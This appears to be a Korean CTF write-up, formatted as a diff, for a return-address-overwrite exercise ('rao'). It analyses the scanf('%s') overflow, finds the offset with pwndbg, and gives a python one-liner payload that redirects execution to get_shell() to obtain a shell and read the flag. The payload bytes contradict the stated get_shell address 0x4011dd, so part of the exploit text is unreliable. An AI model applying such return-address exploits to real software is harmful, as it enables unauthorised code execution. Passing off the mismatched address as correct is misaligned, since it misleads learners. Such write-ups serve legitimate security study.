@@ -1,0 +1,77 @@
+코드 분석
+    - main()함수에서 크기가 0x28(40)바이트인 buf를 선언하고 scanf("%s", buf); 사용
+    - scanf("%s")는 입력 길이를 제한하지 않으므로, buf의 크기를 초과하는 입력을 받을 수 있음.
+        => 버퍼 오버플로우 취약점을 발생 가능
+    -get_shell() 함수는 /bin/sh 실행하여 쉘 획득
+        => 버퍼 오버플로우를 이용하여 get_shell() 함수의 주소를 덮어쓰면 쉘 획득 가능
+
+보호 기법 확인
+    pwndbg> checksec
+        File:     /home/maro/바탕화면/rao
+        Arch:     amd64
+        RELRO:      Partial RELRO
+        Stack:      No canary found
+        NX:         NX enabled
+        PIE:        No PIE (0x400000)
+        SHSTK:      Enabled
+        IBT:        Enabled
+        Stripped:   No
+    => stack canary가 없기 때문에 버퍼 오버플로우 탐지가 불가능
+
+함수 분석
+    pwndbg> disassemble main
+    - sub rsp, 0x30 => 스택에 0x30(48)바이트 공간 할당
+    - lea rax, [rbp-0x30] => buf의 시작 주소가 rbp-0x30
+    - 함수 종료 시 ret 실행 => 반환 주소를 덮어쓸 수 있다면 프로그램 실행 흐름 변경 가능
+
+    pwndbg> p get_shell
+    - 함수의 주소가 0x4011dd <get_shell> 임을 확인
+        => 반환 주소를 0x4011dd로 덮어쓰면 get_shell() 함수 호출 -> 쉘 획득 가능
+
+offset 찾기
+    - cyclic 패턴을 입력하여 프로그램 실행
+        Program received signal SIGSEGV, Segmentation fault. 발생
+    - pwndbg> context
+        RIP : 0x401265 <main+70> ← ret 확인
+        - 반환 주소 위치에 cyclic 패턴이 덮어써진 것을 확인
+    => 반환 주소까지의 정확한 위치 확인 위해 56개의 A와 8개의 B 입력
+        RBP : 0x4141414141414141 ('AAAAAAAA')
+        ret <0x4242424242424242>
+        => saved rbp 영역이 A, return address 영역이 B로 덮어써짐
+            따라서 반환 주소까지의 오프셋은 56바이트(48 + 8)
+
+
+익스플로잇 코드 작성
+
+    $ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
+
+    - b'A'*0x30
+        : buf 영역 채우기 위한 데이터
+
+    - b'B'*0x8
+        : saved rbp 영역 덮어쓰기 위한 데이터
+
+    - b'\xaa\x06\x40\x00\x00\x00\x00\x00'
+        => get_shell() 함수의 주소(0x4011dd)를 little endian 형식으로 저장한 값
+        => 반환 주소를 get_shell() 함수의 주소로 덮어써 실행 흐름을 변경
+
+    - (python3 -c "...";cat)| ./rao
+        => 생성한 payload를 프로그램의 입력으로 전달,
+           cat을 통해 쉘 획득 후 입력 계속 받을 수 있도록
+
+쉘 획득
+
+    $ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
+    $ id
+    id
+    uid=1000(rao) gid=1000(rao) groups=1000(rao)
+
+        => id 명령 정상 실행 확인
+        => 반환 주소가 get_shell() 함수의 주소로 변경되어 execve("/bin/sh")가 실행됨
+        => 쉘 획득 성공
+
+플래그 획득
+
+    $ cat flag
+        => 쉘 환경에서 cat flag 명령을 수행하여 플래그를 확인할 수 있음
+        => 버퍼 오버플로우를 이용하여 프로그램의 실행 흐름을 변경하고 최종적으로 플래그를 획득
